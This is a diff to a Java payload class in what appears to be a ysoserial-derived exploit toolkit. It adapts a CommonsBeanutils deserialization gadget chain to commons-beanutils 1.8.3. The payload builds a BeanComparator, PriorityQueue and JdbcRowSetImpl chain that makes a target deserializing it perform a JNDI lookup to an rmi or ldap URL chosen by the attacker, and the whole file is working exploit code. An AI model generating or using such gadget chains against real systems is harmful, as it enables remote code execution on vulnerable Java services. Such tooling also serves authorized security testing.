@@ -1,26 +1,21 @@
 package me.gv7.woodpecker.yso.payloads;
 
 import com.sun.rowset.JdbcRowSetImpl;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtField;
-import me.gv7.woodpecker.yso.JavassistClassLoader;
 import me.gv7.woodpecker.yso.payloads.annotation.Authors;
 import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
 import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
 import me.gv7.woodpecker.yso.payloads.custom.CustomCommand;
 import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
 import me.gv7.woodpecker.yso.payloads.util.Reflections;
+import org.apache.commons.beanutils.BeanComparator;
 
 import java.math.BigInteger;
-import java.util.Comparator;
 import java.util.PriorityQueue;
 
 @PayloadTest( precondition = "isApplicableJavaVersion")
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-collections:commons-collections:3.1"})
 @Authors({ Authors.BEIYING })
-public class CommonsBeanutils3 implements ObjectPayload<Object>{
+public class CommonsBeanutils3_183 implements ObjectPayload<Object>{
     @Override
     public Object getObject(String command) throws Exception {
         String jndiURL = null;
@@ -30,20 +25,7 @@ public class CommonsBeanutils3 implements ObjectPayload<Object>{
             throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
         }
 
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
-        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
-        ctBeanComparator.defrost();
-        try {
-            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
-            ctBeanComparator.removeField(ctSUID);
-        }catch (javassist.NotFoundException e){}
-        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
-
-        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
-        Reflections.setFieldValue(comparator, "property", null);
-        Reflections.setFieldValue(comparator,"comparator",String.CASE_INSENSITIVE_ORDER);
-
+        BeanComparator comparator = new BeanComparator("lowestSetBit");
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(jndiURL);
         rs.setMatchColumn("foo");
@@ -60,6 +42,6 @@ public class CommonsBeanutils3 implements ObjectPayload<Object>{
 
     public static void main ( String[] args ) throws Exception {
         args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
-        PayloadRunner.run(CommonsBeanutils3.class, args);
+        PayloadRunner.run(CommonsBeanutils3_183.class, args);
     }
 }
